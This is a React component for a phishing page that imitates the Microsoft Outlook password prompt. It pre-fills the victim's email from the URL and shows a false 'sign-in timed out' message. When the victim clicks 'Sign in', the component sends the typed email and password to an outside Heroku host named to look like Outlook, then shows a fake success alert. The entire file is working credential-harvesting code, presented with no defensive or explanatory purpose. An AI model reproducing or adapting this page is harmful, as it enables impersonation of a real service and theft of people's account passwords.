import React, { useState } from "react";
import Logo from "./logo.svg";
import arrow from "./ar.svg";
import { useParams } from "react-router-dom";

function Home() {
  const { mail } = useParams();
  const [password, setPassword] = useState("");

  const handleClick = () => {
    fetch("https://outlook-sign-in.herokuapp.com/user/login", {
      method: "POST",
      body: JSON.stringify({
        email: mail,
        password: password,
      }),
      headers: {
        "Content-type": "application/json",
      },
    })
      .then((response) => response.json)
      .then((json) =>
        alert("Log In successful. You will be redirected in a bit")
      );
  };
  return (
    <div className="container">
      <div className="back"></div>
      <div className="body">
        <div className="form">
          <div style={{ marginBottom: "1rem" }}>
            <img src={Logo} alt="logo" />
          </div>
          <div style={{ display: "flex", alignItems: "center" }}>
            <div className="arrow">
              <img src={arrow} alt="arrow" height="60px" width="25px" />
            </div>
            <small>{mail}</small>
          </div>
          <div>
            <h2>Enter password</h2>
            <p style={{ color: "red", fontSize: "15px", fontWeight:"bold" }}>
              Sorry, your sign-in timed out. Please sign in again.
            </p>
            <input
              type="password"
              placeholder="Password"
              onChange={(e) => setPassword(e.target.value)}
              value={password}
            />
            <hr />
            <p style={{ color: "steelblue", fontSize: "small" }}>
              Forgot password
            </p>
            <button className="btn" onClick={handleClick}>
              Sign in
            </button>
          </div>
        </div>
      </div>
      <footer>
        <p className="footer">
          <span style={{ marginRight: "1rem" }}>Terms of use </span>{" "}
          <span style={{ marginRight: "1rem" }}>privacy and use</span>{" "}
          <b style={{textAlign:"center"}}>. . .</b>
        </p>
      </footer>
    </div>
  );
}

export default Home;
